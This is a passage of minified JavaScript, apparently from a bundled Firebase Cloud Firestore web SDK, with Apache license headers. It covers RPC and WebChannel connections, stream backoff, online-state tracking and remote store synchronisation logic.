IA,this.Oo={},this.onlineStateHandler=null,this.sequenceNumberHandler=null}addPendingMutation(e){}updateMutationState(e,n,i){}addLocalQueryTarget(e,n=!0){return n&&this.xo.js(e),this.Oo[e]||"not-current"}updateQueryState(e,n,i){this.Oo[e]=n}removeLocalQueryTarget(e){this.xo.Hs(e)}isLocalQueryTarget(e){return this.xo.activeTargetIds.has(e)}clearQueryState(e){delete this.Oo[e]}getAllActiveQueryTargets(){return this.xo.activeTargetIds}isActiveQueryTarget(e){return this.xo.activeTargetIds.has(e)}start(){return this.xo=new IA,Promise.resolve()}handleUserChange(e,n,i){}setOnlineState(e){}shutdown(){}writeSequenceNumber(e){}notifyBundleLoaded(e){}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class T9{No(e){}shutdown(){}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kA="ConnectivityMonitor";class DA{constructor(){this.Bo=()=>this.Lo(),this.ko=()=>this.qo(),this.Qo=[],this.$o()}No(e){this.Qo.push(e)}shutdown(){window.removeEventListener("online",this.Bo),window.removeEventListener("offline",this.ko)}$o(){window.addEventListener("online",this.Bo),window.addEventListener("offline",this.ko)}Lo(){xe(kA,"Network connectivity changed: AVAILABLE");for(const e of this.Qo)e(0)}qo(){xe(kA,"Network connectivity changed: UNAVAILABLE");for(const e of this.Qo)e(1)}static C(){return typeof window<"u"&&window.addEventListener!==void 0&&window.removeEventListener!==void 0}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Nf=null;function K0(){return Nf===null?Nf=function(){return 268435456+Math.round(2147483648*Math.random())}():Nf++,"0x"+Nf.toString(16)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const o0="RestConnection",C9={BatchGetDocuments:"batchGet",Commit:"commit",RunQuery:"runQuery",RunAggregationQuery:"runAggregationQuery"};class S9{get Uo(){return!1}constructor(e){this.databaseInfo=e,this.databaseId=e.databaseId;const n=e.ssl?"https":"http",i=encodeURIComponent(this.databaseId.projectId),s=encodeURIComponent(this.databaseId.database);this.Ko=n+"://"+e.host,this.Wo=`projects/${i}/databases/${s}`,this.Go=this.databaseId.database===pm?`project_id=${i}`:`project_id=${i}&database_id=${s}`}zo(e,n,i,s,o){const c=K0(),d=this.jo(e,n.toUriEncodedString());xe(o0,`Sending RPC '${e}' ${c}:`,d,i);const f={"google-cloud-resource-prefix":this.Wo,"x-goog-request-params":this.Go};this.Ho(f,s,o);const{host:p}=new URL(d),v=el(p);return this.Jo(e,d,f,i,v).then(b=>(xe(o0,`Received RPC '${e}' ${c}: `,b),b),b=>{throw mc(o0,`RPC '${e}' ${c} failed with error: `,b,"url: ",d,"request:",i),b})}Yo(e,n,i,s,o,c){return this.zo(e,n,i,s,o)}Ho(e,n,i){e["X-Goog-Api-Client"]=function(){return"gl-js/ fire/"+jc}(),e["Content-Type"]="text/plain",this.databaseInfo.appId&&(e["X-Firebase-GMPID"]=this.databaseInfo.appId),n&&n.headers.forEach((s,o)=>e[o]=s),i&&i.headers.forEach((s,o)=>e[o]=s)}jo(e,n){const i=C9[e];return`${this.Ko}/v1/${n}:${i}`}terminate(){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class N9{constructor(e){this.Zo=e.Zo,this.Xo=e.Xo}e_(e){this.t_=e}n_(e){this.r_=e}i_(e){this.s_=e}onMessage(e){this.o_=e}close(){this.Xo()}send(e){this.Zo(e)}__(){this.t_()}a_(){this.r_()}u_(e){this.s_(e)}c_(e){this.o_(e)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Qn="WebChannelConnection";class R9 extends S9{constructor(e){super(e),this.forceLongPolling=e.forceLongPolling,this.autoDetectLongPolling=e.autoDetectLongPolling,this.useFetchStreams=e.useFetchStreams,this.longPollingOptions=e.longPollingOptions}Jo(e,n,i,s,o){const c=K0();return new Promise((d,f)=>{const p=new HC;p.setWithCredentials(!0),p.listenOnce(qC.COMPLETE,()=>{try{switch(p.getLastErrorCode()){case Lf.NO_ERROR:const b=p.getResponseJson();xe(Qn,`XHR for RPC '${e}' ${c} received:`,JSON.stringify(b)),d(b);break;case Lf.TIMEOUT:xe(Qn,`RPC '${e}' ${c} timed out`),f(new ke(fe.DEADLINE_EXCEEDED,"Request time out"));break;case Lf.HTTP_ERROR:const w=p.getStatus();if(xe(Qn,`RPC '${e}' ${c} failed with status:`,w,"response text:",p.getResponseText()),w>0){let E=p.getResponseJson();Array.isArray(E)&&(E=E[0]);const C=E==null?void 0:E.error;if(C&&C.status&&C.message){const M=function(B){const Y=B.toLowerCase().replace(/_/g,"-");return Object.values(fe).indexOf(Y)>=0?Y:fe.UNKNOWN}(C.status);f(new ke(M,C.message))}else f(new ke(fe.UNKNOWN,"Server responded with status "+p.getStatus()))}else f(new ke(fe.UNAVAILABLE,"Connection failed."));break;default:ze(9055,{l_:e,streamId:c,h_:p.getLastErrorCode(),P_:p.getLastError()})}}finally{xe(Qn,`RPC '${e}' ${c} completed.`)}});const v=JSON.stringify(s);xe(Qn,`RPC '${e}' ${c} sending request:`,s),p.send(n,"POST",v,i,15)})}T_(e,n,i){const s=K0(),o=[this.Ko,"/","google.firestore.v1.Firestore","/",e,"/channel"],c=QC(),d=YC(),f={httpSessionIdParam:"gsessionid",initMessageHeaders:{},messageUrlParams:{database:`projects/${this.databaseId.projectId}/databases/${this.databaseId.database}`},sendRawJson:!0,supportsCrossDomainXhr:!0,internalChannelParams:{forwardChannelRequestTimeoutMs:6e5},forceLongPolling:this.forceLongPolling,detectBufferingProxy:this.autoDetectLongPolling},p=this.longPollingOptions.timeoutSeconds;p!==void 0&&(f.longPollingTimeout=Math.round(1e3*p)),this.useFetchStreams&&(f.useFetchStreams=!0),this.Ho(f.initMessageHeaders,n,i),f.encodeInitMessageHeaders=!0;const v=o.join("");xe(Qn,`Creating RPC '${e}' stream ${s}: ${v}`,f);const b=c.createWebChannel(v,f);let w=!1,E=!1;const C=new N9({Zo:V=>{E?xe(Qn,`Not sending because RPC '${e}' stream ${s} is closed:`,V):(w||(xe(Qn,`Opening RPC '${e}' stream ${s} transport.`),b.open(),w=!0),xe(Qn,`RPC '${e}' stream ${s} sending:`,V),b.send(V))},Xo:()=>b.close()}),M=(V,B,Y)=>{V.listen(B,D=>{try{Y(D)}catch(Q){setTimeout(()=>{throw Q},0)}})};return M(b,ed.EventType.OPEN,()=>{E||(xe(Qn,`RPC '${e}' stream ${s} transport opened.`),C.__())}),M(b,ed.EventType.CLOSE,()=>{E||(E=!0,xe(Qn,`RPC '${e}' stream ${s} transport closed`),C.u_())}),M(b,ed.EventType.ERROR,V=>{E||(E=!0,mc(Qn,`RPC '${e}' stream ${s} transport errored. Name:`,V.name,"Message:",V.message),C.u_(new ke(fe.UNAVAILABLE,"The operation could not be completed")))}),M(b,ed.EventType.MESSAGE,V=>{var B;if(!E){const Y=V.data[0];St(!!Y,16349);const D=Y,Q=(D==null?void 0:D.error)||((B=D[0])===null||B===void 0?void 0:B.error);if(Q){xe(Qn,`RPC '${e}' stream ${s} received error:`,Q);const G=Q.status;let L=function(k){const I=cn[k];if(I!==void 0)return CS(I)}(G),N=Q.message;L===void 0&&(L=fe.INTERNAL,N="Unknown error status: "+G+" with message "+Q.message),E=!0,C.u_(new ke(L,N)),b.close()}else xe(Qn,`RPC '${e}' stream ${s} received:`,Y),C.c_(Y)}}),M(d,GC.STAT_EVENT,V=>{V.stat===P0.PROXY?xe(Qn,`RPC '${e}' stream ${s} detected buffering proxy`):V.stat===P0.NOPROXY&&xe(Qn,`RPC '${e}' stream ${s} detected no buffering proxy`)}),setTimeout(()=>{C.a_()},0),C}}function l0(){return typeof document<"u"?document:null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function pp(t){return new M8(t,!0)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class BS{constructor(e,n,i=1e3,s=1.5,o=6e4){this.xi=e,this.timerId=n,this.I_=i,this.E_=s,this.d_=o,this.A_=0,this.R_=null,this.V_=Date.now(),this.reset()}reset(){this.A_=0}m_(){this.A_=this.d_}f_(e){this.cancel();const n=Math.floor(this.A_+this.g_()),i=Math.max(0,Date.now()-this.V_),s=Math.max(0,n-i);s>0&&xe("ExponentialBackoff",`Backing off for ${s} ms (base delay: ${this.A_} ms, delay with jitter: ${n} ms, last attempt: ${i} ms ago)`),this.R_=this.xi.enqueueAfterDelay(this.timerId,s,()=>(this.V_=Date.now(),e())),this.A_*=this.E_,this.A_<this.I_&&(this.A_=this.I_),this.A_>this.d_&&(this.A_=this.d_)}p_(){this.R_!==null&&(this.R_.skipDelay(),this.R_=null)}cancel(){this.R_!==null&&(this.R_.cancel(),this.R_=null)}g_(){return(Math.random()-.5)*this.A_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const MA="PersistentStream";class zS{constructor(e,n,i,s,o,c,d,f){this.xi=e,this.y_=i,this.w_=s,this.connection=o,this.authCredentialsProvider=c,this.appCheckCredentialsProvider=d,this.listener=f,this.state=0,this.S_=0,this.b_=null,this.D_=null,this.stream=null,this.v_=0,this.C_=new BS(e,n)}F_(){return this.state===1||this.state===5||this.M_()}M_(){return this.state===2||this.state===3}start(){this.v_=0,this.state!==4?this.auth():this.x_()}async stop(){this.F_()&&await this.close(0)}O_(){this.state=0,this.C_.reset()}N_(){this.M_()&&this.b_===null&&(this.b_=this.xi.enqueueAfterDelay(this.y_,6e4,()=>this.B_()))}L_(e){this.k_(),this.stream.send(e)}async B_(){if(this.M_())return this.close(0)}k_(){this.b_&&(this.b_.cancel(),this.b_=null)}q_(){this.D_&&(this.D_.cancel(),this.D_=null)}async close(e,n){this.k_(),this.q_(),this.C_.cancel(),this.S_++,e!==4?this.C_.reset():n&&n.code===fe.RESOURCE_EXHAUSTED?(Vs(n.toString()),Vs("Using maximum backoff delay to prevent overloading the backend."),this.C_.m_()):n&&n.code===fe.UNAUTHENTICATED&&this.state!==3&&(this.authCredentialsProvider.invalidateToken(),this.appCheckCredentialsProvider.invalidateToken()),this.stream!==null&&(this.Q_(),this.stream.close(),this.stream=null),this.state=e,await this.listener.i_(n)}Q_(){}auth(){this.state=1;const e=this.U_(this.S_),n=this.S_;Promise.all([this.authCredentialsProvider.getToken(),this.appCheckCredentialsProvider.getToken()]).then(([i,s])=>{this.S_===n&&this.K_(i,s)},i=>{e(()=>{const s=new ke(fe.UNKNOWN,"Fetching auth token failed: "+i.message);return this.W_(s)})})}K_(e,n){const i=this.U_(this.S_);this.stream=this.G_(e,n),this.stream.e_(()=>{i(()=>this.listener.e_())}),this.stream.n_(()=>{i(()=>(this.state=2,this.D_=this.xi.enqueueAfterDelay(this.w_,1e4,()=>(this.M_()&&(this.state=3),Promise.resolve())),this.listener.n_()))}),this.stream.i_(s=>{i(()=>this.W_(s))}),this.stream.onMessage(s=>{i(()=>++this.v_==1?this.z_(s):this.onNext(s))})}x_(){this.state=5,this.C_.f_(async()=>{this.state=0,this.start()})}W_(e){return xe(MA,`close with error: ${e}`),this.stream=null,this.close(4,e)}U_(e){return n=>{this.xi.enqueueAndForget(()=>this.S_===e?n():(xe(MA,"stream callback skipped by getCloseGuardedDispatcher."),Promise.resolve()))}}}class I9 extends zS{constructor(e,n,i,s,o,c){super(e,"listen_stream_connection_backoff","listen_stream_idle","health_check_timeout",n,i,s,c),this.serializer=o}G_(e,n){return this.connection.T_("Listen",e,n)}z_(e){return this.onNext(e)}onNext(e){this.C_.reset();const n=j8(this.serializer,e),i=function(o){if(!("targetChange"in o))return Ye.min();const c=o.targetChange;return c.targetIds&&c.targetIds.length?Ye.min():c.readTime?$r(c.readTime):Ye.min()}(e);return this.listener.j_(n,i)}H_(e){const n={};n.database=Y0(this.serializer),n.addTarget=function(o,c){let d;const f=c.target;if(d=z0(f)?{documents:U8(o,f)}:{query:B8(o,f).gt},d.targetId=c.targetId,c.resumeToken.approximateByteSize()>0){d.resumeToken=RS(o,c.resumeToken);const p=H0(o,c.expectedCount);p!==null&&(d.expectedCount=p)}else if(c.snapshotVersion.compareTo(Ye.min())>0){d.readTime=wm(o,c.snapshotVersion.toTimestamp());const p=H0(o,c.expectedCount);p!==null&&(d.expectedCount=p)}return d}(this.serializer,e);const i=F8(this.serializer,e);i&&(n.labels=i),this.L_(n)}J_(e){const n={};n.database=Y0(this.serializer),n.removeTarget=e,this.L_(n)}}class k9 extends zS{constructor(e,n,i,s,o,c){super(e,"write_stream_connection_backoff","write_stream_idle","health_check_timeout",n,i,s,c),this.serializer=o}get Y_(){return this.v_>0}start(){this.lastStreamToken=void 0,super.start()}Q_(){this.Y_&&this.Z_([])}G_(e,n){return this.connection.T_("Write",e,n)}z_(e){return St(!!e.streamToken,31322),this.lastStreamToken=e.streamToken,St(!e.writeResults||e.writeResults.length===0,55816),this.listener.X_()}onNext(e){St(!!e.streamToken,12678),this.lastStreamToken=e.streamToken,this.C_.reset();const n=V8(e.writeResults,e.commitTime),i=$r(e.commitTime);return this.listener.ea(i,n)}ta(){const e={};e.database=Y0(this.serializer),this.L_(e)}Z_(e){const n={streamToken:this.lastStreamToken,writes:e.map(i=>L8(this.serializer,i))};this.L_(n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class D9{}class M9 extends D9{constructor(e,n,i,s){super(),this.authCredentials=e,this.appCheckCredentials=n,this.connection=i,this.serializer=s,this.na=!1}ra(){if(this.na)throw new ke(fe.FAILED_PRECONDITION,"The client has already been terminated.")}zo(e,n,i,s){return this.ra(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then(([o,c])=>this.connection.zo(e,q0(n,i),s,o,c)).catch(o=>{throw o.name==="FirebaseError"?(o.code===fe.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),o):new ke(fe.UNKNOWN,o.toString())})}Yo(e,n,i,s,o){return this.ra(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then(([c,d])=>this.connection.Yo(e,q0(n,i),s,c,d,o)).catch(c=>{throw c.name==="FirebaseError"?(c.code===fe.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),c):new ke(fe.UNKNOWN,c.toString())})}terminate(){this.na=!0,this.connection.terminate()}}class O9{constructor(e,n){this.asyncQueue=e,this.onlineStateHandler=n,this.state="Unknown",this.ia=0,this.sa=null,this.oa=!0}_a(){this.ia===0&&(this.aa("Unknown"),this.sa=this.asyncQueue.enqueueAfterDelay("online_state_timeout",1e4,()=>(this.sa=null,this.ua("Backend didn't respond within 10 seconds."),this.aa("Offline"),Promise.resolve())))}ca(e){this.state==="Online"?this.aa("Unknown"):(this.ia++,this.ia>=1&&(this.la(),this.ua(`Connection failed 1 times. Most recent error: ${e.toString()}`),this.aa("Offline")))}set(e){this.la(),this.ia=0,e==="Online"&&(this.oa=!1),this.aa(e)}aa(e){e!==this.state&&(this.state=e,this.onlineStateHandler(e))}ua(e){const n=`Could not reach Cloud Firestore backend. ${e}
This typically indicates that your device does not have a healthy Internet connection at the moment. The client will operate in offline mode until it is able to successfully connect to the backend.`;this.oa?(Vs(n),this.oa=!1):xe("OnlineStateTracker",n)}la(){this.sa!==null&&(this.sa.cancel(),this.sa=null)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const qo="RemoteStore";class P9{constructor(e,n,i,s,o){this.localStore=e,this.datastore=n,this.asyncQueue=i,this.remoteSyncer={},this.ha=[],this.Pa=new Map,this.Ta=new Set,this.Ia=[],this.Ea=o,this.Ea.No(c=>{i.enqueueAndForget(async()=>{il(this)&&(xe(qo,"Restarting streams for network reachability change."),await async function(f){const p=Qe(f);p.Ta.add(4),await Qd(p),p.da.set("Unknown"),p.Ta.delete(4),await gp(p)}(this))})}),this.da=new O9(i,s)}}async function gp(t){if(il(t))for(const e of t.Ia)await e(!0)}async function Qd(t){for(const e of t.Ia)await e(!1)}function FS(t,e){const n=Qe(t);n.Pa.has(e.targetId)||(n.Pa.set(e.targetId,e),v_(n)?y_(n):Uc(n).M_()&&g_(n,e))}function p_(t,e){const n=Qe(t),i=Uc(n);n.Pa.delete(e),i.M_()&&HS(n,e),n.Pa.size===0&&(i.M_()?i.N_():il(n)&&n.da.set("Unknown"))}function g_(t,e){if(t.Aa.Ke(e.targetId),e.resumeToken.approximateByteSize()>0||e.snapshotVersion.compareTo(Ye.min())>0){const n=t.remoteSyncer.getRemoteKeysForTarget(e.targetId).size;e=e.withExpectedCount(n)}Uc(t).H_(e)}function HS(t,e){t.Aa.Ke(e),Uc(t).J_(e)}function y_(t){t.Aa=new R8({getRemoteKeysForTarget:e=>t.remoteSyncer.getRemoteKeysForTarget(e),Rt:e=>t.Pa.get(e)||null,Pt:()=>t.datastore.serializer.databaseId}),Uc(t).start(),t.da._a()}function v_(t){return il(t)&&!Uc(t).F_()&&t.Pa.size>0}function il(t){return Qe(t).Ta.size===0}function qS(t){t.Aa=void 0}async function j9(t){t.da.set("Online")}async function L9(t){t.Pa.forEach((e,n)=>{g_(t,e)})}async function V9(t,e){qS(t),v_(t)?(t.da.ca(e),y_(t)):t.da.set("Unknown")}async function U9(t,e,n){if(t.da.set("Online"),e instanceof NS&&e.state===2&&e.cause)try{await async function(s,o){const c=o.cause;for(const d of o.targetIds)s.Pa.has(d)&&(await s.remoteSyncer.rejectListen(d,c),s.Pa.delete(d),s.Aa.removeTarget(d))}(t,e)}catch(i){xe(qo,"Failed to remove targets %s: %s ",e.targetIds.join(","),i),await xm(t,i)}else if(e instanceof zf?t.Aa.Xe(e):e instanceof SS?t.Aa.ot(e):t.Aa.nt(e),!n.isEqual(Ye.min()))try{const i=await US(t.localStore);n.compareTo(i)>=0&&await function(o,c){const d=o.Aa.It(c);return d.targetChanges.forEach((f,p)=>{if(f.resumeToken.approximateByteSize()>0){const v=o.Pa.get(p);v&&o.Pa.set(p,v.withResumeToken(f.resumeToken,c))}}),d.targetMismatches.forEach((f,p)=>{const v=o.Pa.get(f);if(!v)return;o.Pa.set(f,v.withResumeToken(Bn.EMPTY_BYTE_STRING,v.snapshotVersion)),HS(o,f);const b=new ka(v.target,f,p,v.sequenceNumber);g_(o,b)}),o.remoteSyncer.applyRemoteEvent(d)}(t,n)}catch(i){xe(qo,"Failed to raise snapshot:",i),await xm(t,i)}}async function xm(t,e,n){if(!Vc(e))throw e;t.Ta.add(1),await Qd(t),t.da.set("Offline"),n||(n=()=>US(t.localStore)),t.asyncQueue.enqueueRetryable(async()=>{xe(qo,"Retrying IndexedDB access"),await n(),t.Ta.delete(1),await gp(t)})}function GS(t,e){return e().catch(n=>xm(t,n,e))}async function yp(t){const e=Qe(t),n=Ya(e);let i=e.ha.length>0?e.ha[e.ha.length-1].batchId:t_;for(;B9(e);)try{const s=await b9(e.localStore,i);if(s===null){e.ha.length===0&&n.N_();break}i=s.batchId,z9(e,s)}catch(s){await xm(e,s)}YS(e)&&QS(e)}function B9(t){return il(t)&&t.ha.length<10}function z9(t,e){t.ha.push(e);const n=Ya(t);n.M_()&&n.Y_&&n.Z_(e.mutations)}function YS(t){return il(t)&&!Ya(t).F_()&&t.ha.length>0}function QS(t){Ya(t).start()}async function F9(t){Ya(t).ta()}async function H9(t){const e=Ya(t);for(const n of t.ha)e.Z_(n.mutations)}async function q9(t,e,n){const i=t.ha.shift(),s=l_.from(i,e,n);await GS(t,()=>t.remoteSyncer.applySuccessfulWrite(s)),await yp(t)}async function G9(t,e){e&&Ya(t).Y_&&await async function(i,s){if(function(c){return S8(c)&&c!==fe.ABORTED}(s.code)){const o=i.ha.shift();Ya(i).O_(),await GS(i,()=>i.remoteSyncer.rejectFailedWrite(o.batchId,s)),await yp(i)}}(t,e),YS(t)&&QS(t)}async function OA(t,e){const n=Qe(t);n.asyncQueue.verifyOperationInProgress(),xe(qo,"RemoteStore received new credentials");const i=il(n);n.Ta.add(3),await Qd(n),i&&n.da.set("Unknown"),await n.remoteSyncer.handleCredentialChange(e),n.Ta.delete(3),await gp(n)}async function Y9(t,e){const n=Qe(t);e?(n.Ta.delete(2),await gp(n)):e||(n.Ta.add(2),await Qd(n),n.da.set("Unknown"))}function Uc(t){return t.Ra||(t.Ra=function(n,i,s){const o=Qe(n);return o.ra(),new I9(i,o.connection,o.authCredentials,o.appCheckCredentials,o.serializer,s)}(t.datastore,t.asyncQueue,{e_:j9.bind(null,t),n_:L9.bind(null,t),i_:V9.bind(null,t),j_:U9.bind(null,t)}),t.Ia.push(async e=>{e?(t.Ra.O_(),v_(t)?y_(t):t.da.set("Unknown")):(await t.Ra.stop(),qS(t))})),t.Ra}function Ya(t){return t.Va||(t.Va=function(n,i,s){const o=Qe(n);return o.ra(),new k9(i,o.connection,o.authCredentials,o.appCheckCredentials,o.serializer,s)}(t.datastore,t.asyncQueue,{e_:()=>Promise.resolve(),n_:F9.bind(null,t),i_:G9.bind(null,t),X_:H9.bind(null,t),ea:q9.bind(null,t)}),t.Ia.push(async e=>{e?(t.Va.O_(),await yp(t)):(await t.Va.stop(),t.ha.length>0&&(xe(qo,`Stopping write stream with ${t.ha.length} pending writes`),t.ha=[]))})),t.Va}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class __{constructor(e,n,i,s,o){this.asyncQueue=e,this.timerId=n,this.targetTimeMs=i,this.op=s,this.removalCallback=o,this.deferred=new Ps,this.then=this.deferred.promise.then.bind(this.deferred.promise),this.deferred.promise.catch(c=>{})}get promise(){return this.deferred.promise}static createAndSchedule(e,n,i,s,o){const c=Date.now()+i,d=new __(e,n,c,s,o);return d.start(i),d}start(e){this.timerHandle=setTimeout(()=>this.handleDelayElapsed(),e)}skipDelay(){return this.handleDelayElapsed()}cancel(e){this.timerHandle!==null&&(this.clearTimeout(),this.deferred.reject(new ke(fe.CANCELLED,"Operation cancelled"+(e?": "+e:""))))}handleDelayElapsed(){this.asyncQueue.enqueueAndForget(()=>this.timerHandle!==null?(this.clearTimeout(),this.op().then(e=>this.deferred.resolve(e))):Promise.resolve())}clearTimeout(){this.timerHandle!==null&&(this.removalCallback(this),clearTimeout(this.timerHandle),this.timerHandle=null)}}function w_(t,e){if(Vs("AsyncQueue",`${e}: ${t}`),Vc(t))return new ke(fe.UNAVAILABLE,`${e}: ${t}`);throw t}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nc{static emptySet(e){return new nc(e.comparator)}constructor(e){this.comparator=e?(n,i)=>e(n,i)||Pe.comparator(n.key,i.key):(n,i)=>Pe.comparator(n.key,i.key),this.keyedMap=td(),this.sortedSet=new un(this.comparator)}has(e){return this.keyedMap.get(e)!=null}get(e){return this.keyedMap.get(e)}first(){return this.sortedSet.minKey()}last(){return this.sortedSet.maxKey()}isEmpty(){return this.sortedSet.isEmpty()}indexOf(e){const n=this.keyedMap.get(e);return n?this.sortedSet.indexOf(n):-1}get size(){return this.sortedSet.size}forEach(e){this.sortedSet.inorderTraversal((n,i)=>(e(n),!1))}add(e){const n=this.delete(e.key);return n.copy(n.keyedMap.insert(e.key,e),n.sortedSet.insert(e,null))}delete(e){const n=this.get(e);return n?this.copy(this.keyedMap.remove(e),this.sortedSet.remove(n)):this}isEqual(e){if(!(e instanceof nc)||this.size!==e.size)return!1;const n=this.sortedSet.getIterator(),i=e.sortedSet.getIterator();for(;n.hasNext();){const s=n.getNext().key,o=i.getNext().key;if(!s.isEqual(o))return!1}return!0}toString(){const e=[];return this.forEach(n=>{e.push(n.toString())}),e.length===0?"DocumentSet ()":`DocumentSet (
  `+e.join(`  
`)+`
)`}copy(e,n){const i=new nc;return i.comparator=this.comparator,i.keyedMap=e,i.sortedSet=n,i}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
